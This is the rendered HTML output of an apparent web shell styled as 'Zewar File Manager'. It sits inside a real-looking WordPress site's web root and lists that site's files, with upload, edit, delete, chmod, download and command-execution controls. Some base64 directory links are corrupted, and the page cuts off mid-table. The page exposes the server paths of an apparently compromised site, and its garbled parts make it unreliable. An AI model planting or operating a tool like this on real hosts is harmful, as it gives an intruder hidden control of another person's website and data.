<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zewar File Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 100%);
            color: #fff;
            min-height: 100vh;
            padding: 15px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(20, 20, 30, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            border: 1px solid rgba(255, 215, 0, 0.2);
            overflow: hidden;
        }
        .header {
            padding: 15px 20px;
            background: rgba(0,0,0,0.3);
            border-bottom: 1px solid rgba(255,215,0,0.2);
        }
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .logo h1 { font-size: 1.4rem; background: linear-gradient(135deg, #ffd700, #b800ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .logo p { font-size: 0.7rem; color: #aaa; }
        .stats { display: flex; gap: 15px; }
        .stat { text-align: center; padding: 5px 12px; background: rgba(255,255,255,0.05); border-radius: 8px; }
        .stat-value { font-size: 1rem; font-weight: bold; color: #ffd700; }
        .stat-label { font-size: 0.6rem; color: #aaa; }
        .toolbar {
            padding: 12px 15px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            border-bottom: 1px solid rgba(255,215,0,0.1);
        }
        .btn {
            padding: 6px 14px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 0.8rem;
        }
        .btn-primary { background: linear-gradient(135deg, #ffd700, #b800ff); color: #000; }
        .btn-primary:hover { transform: translateY(-1px); }
        .btn-danger { background: rgba(255,59,48,0.2); border: 1px solid #ff3b30; color: #ff3b30; }
        .btn-outline { background: transparent; border: 1px solid #ffd700; color: #ffd700; }
        .btn-outline:hover { background: rgba(255,215,0,0.1); }
        .btn-up { background: rgba(0,200,83,0.2); border: 1px solid #00c853; color: #00c853; }
        .btn-root { background: rgba(255,215,0,0.2); border: 1px solid #ffd700; color: #ffd700; }
        .breadcrumb {
            padding: 10px 15px;
            background: rgba(0,0,0,0.2);
            font-size: 0.75rem;
            border-bottom: 1px solid rgba(255,215,0,0.1);
        }
        .breadcrumb a { color: #ffd700; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .file-table { overflow-x: auto; }
        .file-table table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 10px 12px; text-align: left; background: rgba(255,215,0,0.1); color: #ffd700; font-weight: 600; font-size: 0.75rem; }
        .file-table td { padding: 8px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.75rem; }
        .file-table tr:hover td { background: rgba(255,255,255,0.03); }
        .item-name { display: flex; align-items: center; gap: 8px; }
        .item-icon { font-size: 1.1rem; }
        .item-link { color: #fff; text-decoration: none; }
        .item-link:hover { color: #ffd700; }
        .action-group { display: flex; gap: 5px; flex-wrap: wrap; }
        .action-btn {
            background: rgba(255,255,255,0.08);
            border: none;
            padding: 3px 8px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.65rem;
            color: #fff;
            transition: all 0.2s;
        }
        .action-btn:hover { background: #ffd700; color: #000; }
        .badge { display: inline-block; padding: 2px 5px; border-radius: 3px; font-size: 0.65rem; font-family: monospace; background: rgba(255,215,0,0.2); color: #ffd700; }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #1e1e2e;
            border-radius: 16px;
            width: 90%;
            max-width: 500px;
            border: 1px solid rgba(255,215,0,0.3);
        }
        .modal-header { padding: 15px 20px; border-bottom: 1px solid rgba(255,215,0,0.2); display: flex; justify-content: space-between; align-items: center; }
        .modal-header h3 { color: #ffd700; font-size: 1.1rem; }
        .modal-close { background: none; border: none; font-size: 1.3rem; cursor: pointer; color: #aaa; }
        .modal-body { padding: 20px; }
        .modal-body input, .modal-body textarea, .modal-body select {
            width: 100%;
            padding: 8px 12px;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,215,0,0.3);
            border-radius: 8px;
            color: #fff;
            margin-bottom: 12px;
        }
        .modal-body textarea { min-height: 150px; font-family: monospace; }
        .modal-footer { padding: 12px 20px; border-top: 1px solid rgba(255,215,0,0.2); display: flex; justify-content: flex-end; gap: 10px; }
        .cmd-output {
            background: #0a0a0a;
            border-radius: 8px;
            padding: 10px;
            font-family: monospace;
            font-size: 0.7rem;
            color: #0f0;
            max-height: 250px;
            overflow: auto;
            margin-top: 10px;
        }
        .cmd-output.error { color: #ff6b6b; }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 10px 20px;
            background: #1e1e2e;
            border-left: 3px solid;
            border-radius: 8px;
            z-index: 1100;
            display: none;
            font-size: 0.8rem;
        }
        .toast.show { display: block; animation: slideIn 0.3s ease; }
        .toast.success { border-left-color: #00c853; }
        .toast.error { border-left-color: #ff3b30; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @media (max-width: 768px) {
            .toolbar { flex-direction: column; }
            .action-group { flex-wrap: wrap; }
            .file-table th, .file-table td { padding: 6px 8px; font-size: 0.7rem; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <h1><i class="fas fa-crown"></i> Zewar File Manager</h1>
                <p>Secure • Fast • Powerful</p>
            </div>
            <div class="stats">
                <div class="stat"><div class="stat-value">41</div><div class="stat-label">Items</div></div>
                <div class="stat"><div class="stat-value">18:01</div><div class="stat-label">Time</div></div>
            </div>
        </div>
    </div>
    
    <div class="toolbar">
                <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk" class="btn btn-root"><i class="fas fa-home"></i> Root</a>
        <button class="btn btn-primary" onclick="openModal('uploadModal')"><i class="fas fa-upload"></i> Upload</button>
        <button class="btn btn-outline" onclick="openModal('folderModal')"><i class="fas fa-folder-plus"></i> Folder</button>
        <button class="btn btn-outline" onclick="openModal('fileModal')"><i class="fas fa-file-plus"></i> File</button>
        <button class="btn btn-outline" onclick="openCommandModal()"><i class="fas fa-terminal"></i> CMD</button>
        <form method="post" style="margin-left: auto;" onsubmit="return confirm('Logout?')">
            <input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01">
            <button type="submit" name="logout" class="btn btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</button>
        </form>
    </div>
    
    <div class="breadcrumb">
        <i class="fas fa-folder-open"></i> 
        <a href="?d=L2hvbWU=">home</a><span class="separator">/</span><a href="?d=L2hvbWUvbWVleTU1NzU=">meey5575</a><span class="separator">/</span><a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWw=">public_html</a><span class="separator">/</span><a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk">drchicken.co.id</a>    </div>
    
    <div class="file-table">
        <table>
            <thead><tr><th>Type</th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
            <tbody>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkLy50bWI=" class="item-link">.tmb</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0777</span></td>
                    <td>2026-04-10 00:25:12</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('.tmb')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('.tmb')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkLy53ZWxsLWtub3du" class="item-link">.well-known</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2026-04-10 17:19:13</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('.well-known')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('.well-known')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL19fTUFDT1NY" class="item-link">__MACOSX</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2025-12-24 17:37:19</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('__MACOSX')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('__MACOSX')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL2NnaS1iaW4=" class="item-link">cgi-bin</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2026-02-12 00:10:15</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('cgi-bin')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('cgi-bin')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL2RhdGFiYXNl" class="item-link">database</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('database')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('database')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUQDvDUxFShoWWbHougyHjr0tFz3E38fX8e0bnTUpya-P0mXW==" class="item-link">images</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2025-11-10 16:42:54</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('images')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('images')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTUQDvDUxFShoWWbHougyHjr0tFz3E38fX8e0bnTUpya-P0mXW==" class="item-link">new</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2026-04-10 17:44:55</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('new')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('new')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL3dwLWFkbWlu" class="item-link">wp-admin</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2026-04-10 17:39:31</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('wp-admin')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-admin')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL3dwLWNvbnRlbnQ=" class="item-link">wp-content</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2026-04-10 17:52:30</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('wp-content')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-content')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📁</span></td>
                    <td class="item-name">
                                                    <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlkL3dwLWluY2x1ZGVz" class="item-link">wp-includes</a>
                                            </td>
                    <td>📁</td>
                    <td><span class="badge">0755</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                <button class="action-btn" onclick="renameItem('wp-includes')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-includes')"><i class="fas fa-trash"></i> Del</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📄</span></td>
                    <td class="item-name">
                                                    8CB27CF108F37541EBE74254554D68FB.txt                                            </td>
                    <td>53 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('8CB27CF108F37541EBE74254554D68FB.txt')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=OENCMjdDRjEwOEYzNzU0MUVCRTc0MjU0NTU0RDY4RkIudHh0" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('8CB27CF108F37541EBE74254554D68FB.txt')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('8CB27CF108F37541EBE74254554D68FB.txt')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('8CB27CF108F37541EBE74254554D68FB.txt', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🖼️</span></td>
                    <td class="item-name">
                                                    android-chrome-192x192.png                                            </td>
                    <td>35.6 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('android-chrome-192x192.png')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=YW5kcm9pZC1jaHJvbWUtMTkyeDE5Mi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('android-chrome-192x192.png')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('android-chrome-192x192.png')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('android-chrome-192x192.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🖼️</span></td>
                    <td class="item-name">
                                                    android-chrome-512x512.png                                            </td>
                    <td>179.5 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('android-chrome-512x512.png')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=YW5kcm9pZC1jaHJvbWUtNTEyeDUxMi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('android-chrome-512x512.png')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('android-chrome-512x512.png')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('android-chrome-512x512.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🖼️</span></td>
                    <td class="item-name">
                                                    apple-touch-icon.png                                            </td>
                    <td>32.2 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('apple-touch-icon.png')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=YXBwbGUtdG91Y2gtaWNvbi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('apple-touch-icon.png')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('apple-touch-icon.png')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('apple-touch-icon.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📄</span></td>
                    <td class="item-name">
                                                    error_log                                            </td>
                    <td>2.2 MB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2026-04-04 21:37:21</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('error_log')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=ZXJyb3JfbG9n" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('error_log')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('error_log')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('error_log', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📄</span></td>
                    <td class="item-name">
                                                    F0BE255897E6BE82E1AA62706D5F31D5.txt                                            </td>
                    <td>53 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('F0BE255897E6BE82E1AA62706D5F31D5.txt')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=RjBCRTI1NTg5N0U2QkU4MkUxQUE2MjcwNkQ1RjMxRDUudHh0" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('F0BE255897E6BE82E1AA62706D5F31D5.txt')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('F0BE255897E6BE82E1AA62706D5F31D5.txt')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('F0BE255897E6BE82E1AA62706D5F31D5.txt', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🖼️</span></td>
                    <td class="item-name">
                                                    favicon-16x16.png                                            </td>
                    <td>870 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('favicon-16x16.png')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=ZmF2aWNvbi0xNngxNi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('favicon-16x16.png')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('favicon-16x16.png')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('favicon-16x16.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🖼️</span></td>
                    <td class="item-name">
                                                    favicon-32x32.png                                            </td>
                    <td>2.3 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('favicon-32x32.png')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=ZmF2aWNvbi0zMngzMi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('favicon-32x32.png')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('favicon-32x32.png')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('favicon-32x32.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📄</span></td>
                    <td class="item-name">
                                                    favicon.ico                                            </td>
                    <td>15 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('favicon.ico')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=ZmF2aWNvbi5pY28=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('favicon.ico')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('favicon.ico')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('favicon.ico', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🌐</span></td>
                    <td class="item-name">
                                                    googleafbd3c1e6198f85e.html                                            </td>
                    <td>53 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-11-10 16:27:26</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('googleafbd3c1e6198f85e.html')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=Z29vZ2xlYWZiZDNjMWU2MTk4Zjg1ZS5odG1s" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('googleafbd3c1e6198f85e.html')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('googleafbd3c1e6198f85e.html')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('googleafbd3c1e6198f85e.html', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📄</span></td>
                    <td class="item-name">
                                                    image                                            </td>
                    <td>1.4 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-11-10 16:42:54</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('image')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=aW1hZ2U=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('image')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('image')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('image', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    index.php                                            </td>
                    <td>404 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2026-04-04 21:15:05</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('index.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=aW5kZXgucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('index.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('index.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('index.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📄</span></td>
                    <td class="item-name">
                                                    license.txt                                            </td>
                    <td>19.4 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('license.txt')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=bGljZW5zZS50eHQ=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('license.txt')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('license.txt')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('license.txt', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🌐</span></td>
                    <td class="item-name">
                                                    readme.html                                            </td>
                    <td>7.3 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2026-03-12 05:18:39</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('readme.html')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=cmVhZG1lLmh0bWw=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('readme.html')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('readme.html')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('readme.html', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📄</span></td>
                    <td class="item-name">
                                                    README.md                                            </td>
                    <td>754 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('README.md')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=UkVBRE1FLm1k" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('README.md')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('README.md')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('README.md', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">📄</span></td>
                    <td class="item-name">
                                                    site.webmanifest                                            </td>
                    <td>263 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('site.webmanifest')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=c2l0ZS53ZWJtYW5pZmVzdA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('site.webmanifest')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('site.webmanifest')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('site.webmanifest', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    test.php                                            </td>
                    <td>6 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2026-04-04 21:12:28</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('test.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=dGVzdC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('test.php')"><i class="fas fa-pen"></i> Ren</button>
